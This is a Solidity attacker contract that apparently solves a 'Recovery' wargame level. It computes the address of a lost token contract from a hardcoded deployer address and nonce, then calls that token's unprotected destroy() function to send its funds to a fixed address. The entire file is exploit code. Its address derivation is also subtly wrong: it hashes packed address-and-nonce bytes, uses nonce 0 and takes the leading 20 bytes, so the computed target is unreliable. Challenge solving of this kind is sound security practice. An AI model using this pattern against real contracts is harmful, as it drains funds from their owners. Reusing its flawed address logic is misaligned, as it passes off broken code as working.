pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}


contract RecoveryFinalAttacker {
    address public target;

    constructor() {
        address recoveryInstance = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
        uint256 nonce = 0;
        bytes32 hash = keccak256(abi.encodePacked(recoveryInstance, nonce));
        target = address(uint160(bytes20(hash)));
    }

    function destroyToken() external {
        ISimpleToken(target).destroy(payable(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266));
    }
}